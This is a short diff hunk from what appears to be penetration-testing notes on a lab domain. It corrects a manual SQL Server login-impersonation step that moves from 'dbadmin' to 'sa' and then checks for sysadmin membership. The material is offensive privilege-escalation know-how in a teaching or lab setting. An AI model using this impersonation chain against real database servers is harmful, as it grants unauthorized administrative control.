@@ -296,7 +296,7 @@ VERBOSE: MVU-SQL.us.marvel.local  : - EXPLOITING: Starting exploit process...
 Impersonate Manualy 
 ```
 EXECUTE AS LOGIN = 'dbadmin'
-EXECUTE AS = 'sa'
+EXECUTE AS LOGIN = 'sa'
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
